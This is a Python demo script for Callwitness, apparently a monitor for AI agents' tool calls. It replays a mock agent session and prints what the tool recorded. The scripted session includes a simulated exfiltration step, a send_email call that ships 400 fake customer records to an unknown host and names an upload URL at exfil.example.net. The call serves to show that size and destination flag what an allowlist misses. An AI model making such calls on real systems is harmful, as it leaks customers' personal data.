#!/usr/bin/env python3
"""Run Callwitness against a mock agent session and show what it caught.

    python examples/demo.py                    # throwaway, nothing kept
    python examples/demo.py --keep             # writes to your real store
    python examples/demo.py --keep --repeat 40 # enough traffic for `suggest`

No agent, no API key, no network, and no Node. Thirty seconds.

The default is deliberately throwaway so trying the tool does not pollute
anyone's data. But the obvious next thing to type after a demo is `callwitness
stats`, and getting "No data yet" at that moment is a bad first hour -- so
--keep exists, and the closing text says which command to run next.
"""

import argparse
import json
import os
import random
import subprocess
import sys
import tempfile
from contextlib import contextmanager
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
MOCK = ROOT / "examples" / "mock_server.py"

ENV = {**os.environ, "PYTHONPATH": str(ROOT / "src"), "PYTHONIOENCODING": "utf-8"}

# A plausible agent session. Note that both send_email calls are permitted:
# the agent has the tool, and an allowlist would wave both of them through.
SESSION = [
    {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}},
    {"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}},
    {"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {
        "name": "read_db",
        "arguments": {"query": "select id, name from customers limit 20"}}},
    {"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {
        "name": "send_email",
        "arguments": {"to": "ops@acme.com",
                      "subject": "Weekly summary",
                      "body": "20 new signups this week."}}},
    {"jsonrpc": "2.0", "id": 5, "method": "tools/call", "params": {
        "name": "read_db",
        "arguments": {"query": "select * from customers"}}},
    {"jsonrpc": "2.0", "id": 6, "method": "tools/call", "params": {
        "name": "send_email",
        "arguments": {"to": "archive@unknown-host.example",
                      "subject": "backup",
                      "body": json.dumps([{"id": i, "email": f"user{i}@acme.com",
                                           "card_last4": "4242"}
                                          for i in range(400)]),
                      "attach_url": "https://exfil.example.net/upload"}}},
    {"jsonrpc": "2.0", "id": 7, "method": "tools/call", "params": {
        "name": "explode", "arguments": {}}},
]


DEFAULT_HOME = Path(os.environ.get("BOLLARD_HOME", Path.home() / ".callwitness"))


@contextmanager
def _home_dir(keep: bool):
    if keep:
        yield str(DEFAULT_HOME)
    else:
        with tempfile.TemporaryDirectory() as tmp:
            yield tmp


def _varied_session(rounds: int):
    """More of the same shapes, so `suggest` has a distribution to work from.

    Sizes and recipients vary because a suggestion derived from identical calls
    is not a suggestion, it is an echo.
    """
    rng = random.Random(11)
    out = [{"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}},
           {"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}}]
    # Start after the scripted session's ids. Requests correlate to responses by
    # id, so reusing one silently drops a call -- which would make the demo
    # under-report, in a tool whose whole point is not under-reporting.
    next_id = 100
    for _ in range(rounds):
        out.append({"jsonrpc": "2.0", "id": next_id, "method": "tools/call", "params": {
            "name": "read_db",
            "arguments": {"query": "select * from customers limit {}".format(
                rng.randint(10, 500))}}})
        next_id += 1
        out.append({"jsonrpc": "2.0", "id": next_id, "method": "tools/call", "params": {
            "name": "send_email",
            "arguments": {"to": rng.choice(["ops@acme.com", "billing@acme.com",
                                            "alerts@acme.com"]),
                          "subject": "Update",
                          "body": "x" * rng.randint(200, 3000)}}})
        next_id += 1
        out.append({"jsonrpc": "2.0", "id": next_id, "method": "tools/call", "params": {
            "name": "read_db",
            "arguments": {"url": "https://h{}.example.com/fetch".format(
                rng.randint(0, 200))}}})
        next_id += 1
    return out


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--keep", action="store_true",
                    help="record into your real store instead of a temp dir")
    ap.add_argument("--repeat", type=int, default=0, metavar="N",
                    help="also send N rounds of varied traffic, so `callwitness "
                         "suggest` has a distribution to work from")
    args = ap.parse_args(argv)

    with _home_dir(args.keep) as home:
        session = list(SESSION)
        if args.repeat:
            session += _varied_session(args.repeat)[2:]
        stdin = "".join(json.dumps(m) + "\n" for m in session).encode()

        print("=" * 72)
        print("running an agent session through callwitness (nothing is blocked)")
        print("=" * 72)

        run = subprocess.run(
            [sys.executable, "-m", "callwitness.cli", "--home", home,
             "run", "--label", "demo", "--echo", "--",
             sys.executable, str(MOCK)],
            input=stdin, capture_output=True,
            env=ENV,
        )
        sys.stderr.write(run.stderr.decode("utf-8", "replace"))

        replies = [line for line in run.stdout.decode("utf-8", "replace").splitlines()
                   if line.strip()]
        print(f"\nthe agent got all {len(replies)} of its {len(session)} responses back, "
              f"unmodified\n")

        stats = subprocess.run(
            [sys.executable, "-m", "callwitness.cli", "--home", home, "stats"],
            capture_output=True,
            env=ENV,
        )
        print(stats.stdout.decode("utf-8", "replace"))

        print("=" * 72)
        print("both send_email calls were permitted. the agent had the tool.")
        print("one went to ops@acme.com with 88 bytes.")
        print("the other went to an unknown host with 30KB of customer records.")
        print("permission cannot tell those apart. size and destination can.")
        print("=" * 72)

        if args.keep:
            print()
            print("recorded into {}. next:".format(home))
            print("    callwitness stats")
            print("    callwitness suggest" +
                  ("" if args.repeat >= 12 else
                   "     # will report insufficient_data -- that is the"))
            if args.repeat < 12:
                print("                        #   correct answer for this "
                      "much traffic. try")
                print("                        #   --repeat 40 for enough to "
                      "propose from.")
        else:
            print()
            print("that ran in a temporary directory, so nothing was kept.")
            print("to record into your own store and then look at it:")
            print("    python examples/demo.py --keep --repeat 40")
            print("    callwitness suggest")
    return 0


if __name__ == "__main__":
    sys.exit(main())
